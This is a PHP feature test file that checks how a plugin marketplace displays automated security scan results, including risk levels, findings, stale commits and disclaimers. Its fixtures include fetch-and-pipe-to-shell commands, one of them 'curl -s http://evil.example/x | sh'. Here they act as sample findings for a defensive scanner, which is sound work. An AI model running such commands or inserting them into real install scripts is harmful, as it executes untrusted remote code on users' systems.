<?php

namespace Tests\Feature;

use App\Enums\RiskLevel;
use App\Enums\SecurityScanStatus;
use App\Models\Plugin;
use App\Models\SecurityScan;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class PluginSecurityReviewTest extends TestCase
{
    use RefreshDatabase;

    private function publishedPlugin(array $overrides = []): Plugin
    {
        return Plugin::factory()->published()->create($overrides);
    }

    private function successfulScan(Plugin $plugin, array $overrides = []): SecurityScan
    {
        return $plugin->securityScans()->create(array_merge([
            'commit_sha' => (string) $plugin->latest_commit_sha,
            'status' => SecurityScanStatus::Succeeded,
            'risk_level' => RiskLevel::None,
            'rules_run' => ['sudo', 'curl_pipe_sh'],
            'started_at' => now()->subDay(),
            'finished_at' => now()->subDay(),
        ], $overrides));
    }

    public function test_unscanned_plugin_shows_not_yet_reviewed_notice(): void
    {
        $plugin = $this->publishedPlugin();

        $this->get("/plugins/{$plugin->slug}")
            ->assertOk()
            ->assertSee('Not yet security-reviewed');
    }

    public function test_clean_scan_shows_no_obvious_issues_and_commit(): void
    {
        $plugin = $this->publishedPlugin();
        $scan = $this->successfulScan($plugin);

        $this->get("/plugins/{$plugin->slug}")
            ->assertOk()
            ->assertSee('No obvious issues detected')
            ->assertSee('Security review', false)
            ->assertSee('Risk level', false)
            ->assertSee(substr($scan->commit_sha, 0, 7));
    }

    public function test_scan_with_findings_shows_risk_and_finding_details(): void
    {
        $plugin = $this->publishedPlugin();
        $scan = $this->successfulScan($plugin, ['risk_level' => RiskLevel::High]);
        $scan->findings()->create([
            'rule' => 'curl_pipe_sh',
            'severity' => 'high',
            'file' => 'install.sh',
            'line' => 2,
            'snippet' => 'curl -s http://evil.example/x | sh',
            'description' => 'curl output is executed by a shell.',
        ]);

        $this->get("/plugins/{$plugin->slug}")
            ->assertOk()
            ->assertSee('Potentially dangerous behavior detected')
            ->assertSee('High', false)
            ->assertSee('curl_pipe_sh')
            ->assertSee('install.sh:2')
            ->assertSee('curl -s http://evil.example/x | sh');
    }

    public function test_stale_scan_warns_a_newer_commit_is_unreviewed(): void
    {
        $plugin = $this->publishedPlugin();
        $this->successfulScan($plugin, ['commit_sha' => str_repeat('0', 40)]);

        $this->get("/plugins/{$plugin->slug}")
            ->assertOk()
            ->assertSee('Newer commit', false)
            ->assertSee('not yet reviewed', false);
    }

    public function test_failed_scan_shows_incomplete_state(): void
    {
        $plugin = $this->publishedPlugin();
        $plugin->securityScans()->create([
            'commit_sha' => (string) $plugin->latest_commit_sha,
            'status' => SecurityScanStatus::Failed,
            'started_at' => now()->subHour(),
            'finished_at' => now()->subHour(),
        ]);

        $this->get("/plugins/{$plugin->slug}")
            ->assertOk()
            ->assertSee('Security scan did not complete')
            ->assertSee('Automated analysis only — not a security guarantee.', false);
    }

    public function test_disclaimer_is_always_present(): void
    {
        $plugin = $this->publishedPlugin();

        $this->get("/plugins/{$plugin->slug}")
            ->assertOk()
            ->assertSee('Automated analysis only', false);
    }

    public function test_documentation_findings_are_tagged_and_link_to_the_file(): void
    {
        $plugin = $this->publishedPlugin();
        $sha = str_repeat('a', 40);
        $scan = $this->successfulScan($plugin, [
            'commit_sha' => $sha,
            'risk_level' => RiskLevel::Low,
        ]);
        $scan->findings()->create([
            'rule' => 'curl_pipe_sh',
            'severity' => 'high',
            'file' => "{$plugin->repository_name}-{$sha}/README.md",
            'line' => 28,
            'snippet' => 'curl -sSL https://x.io/install.sh | sh',
            'description' => 'curl output is executed by a shell.',
        ]);

        $blob = "https://github.com/{$plugin->repository_owner}/{$plugin->repository_name}/blob/{$sha}/README.md#L28";

        $this->get("/plugins/{$plugin->slug}")
            ->assertOk()
            ->assertSee('docs', false)
            ->assertSee($blob, false)
            ->assertSee('README.md:28')
            ->assertDontSee('>high<', false);
    }
}
